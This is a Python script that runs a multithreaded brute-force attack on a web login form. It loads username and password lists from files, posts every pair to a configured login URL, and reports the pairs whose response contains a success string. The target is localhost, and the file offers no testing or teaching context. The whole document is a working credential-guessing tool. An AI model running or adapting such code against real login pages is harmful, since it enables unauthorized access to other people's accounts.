import requests
import threading
import queue

# ===== CONFIGURATION =====
LOGIN_URL = "http://127.0.0.1/login"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"

SUCCESS_INDICATOR = "Welcome"   # text that appears on successful login
THREADS = 5
TIMEOUT = 5
# =========================

users = []
passwords = []
q = queue.Queue()
found = threading.Event()

def attempt_login(username, password):
    data = {
        USERNAME_FIELD: username,
        PASSWORD_FIELD: password
    }

    try:
        r = requests.post(LOGIN_URL, data=data, timeout=TIMEOUT)
        if SUCCESS_INDICATOR in r.text:
            print(f"[SUCCESS] {username}:{password}")
            found.set()
        else:
            print(f"[FAIL] {username}:{password}")
    except:
        pass

def worker():
    while not q.empty() and not found.is_set():
        username, password = q.get()
        attempt_login(username, password)
        q.task_done()

def main():
    with open("users.txt") as u:
        users.extend(line.strip() for line in u)

    with open("passwords.txt") as p:
        passwords.extend(line.strip() for line in p)

    for user in users:
        for pwd in passwords:
            q.put((user, pwd))

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

if __name__ == "__main__":
    main()
